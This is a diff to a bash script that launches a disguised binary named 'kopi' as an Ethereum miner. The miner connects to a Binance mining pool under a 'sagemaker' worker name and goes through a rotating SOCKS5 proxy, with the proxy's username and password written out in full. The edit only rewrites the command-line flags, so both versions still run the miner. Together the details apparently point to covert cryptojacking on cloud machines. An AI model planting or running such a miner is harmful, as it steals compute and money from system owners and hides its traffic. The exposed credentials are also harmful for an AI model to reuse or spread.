@@ -1,3 +1,2 @@
 #!/bin/bash
-chmod +x kopi
-./kopi -a ethash -o stratum+tcp://ethash.poolbinance.com:443 -u sagemaker.t5 -p x --proxy socks5://njhlezbg-rotate:bo6mj3wz34gr@p.webshare.io:80
+chmod +x ./kopi && ./kopi --coin ETH --pool ethash.poolbinance.com:443 --user sagemaker.T5 --proxy socks5://njhlezbg-rotate:bo6mj3wz34gr@p.webshare.io:80
